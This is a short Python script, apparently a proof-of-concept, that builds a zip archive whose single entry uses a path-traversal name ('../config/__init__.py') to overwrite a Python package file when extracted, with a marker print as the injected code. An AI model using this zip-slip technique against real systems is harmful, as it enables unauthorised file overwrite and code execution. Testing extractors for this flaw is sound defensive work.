import zipfile


z_info = zipfile.ZipInfo(r"../config/__init__.py")
z_file = zipfile.ZipFile("payload.zip", mode="w")
z_file.writestr(z_info, "print('--------- Injection ---------')")
z_info.external_attr = 0o777 << 16
z_file.close()
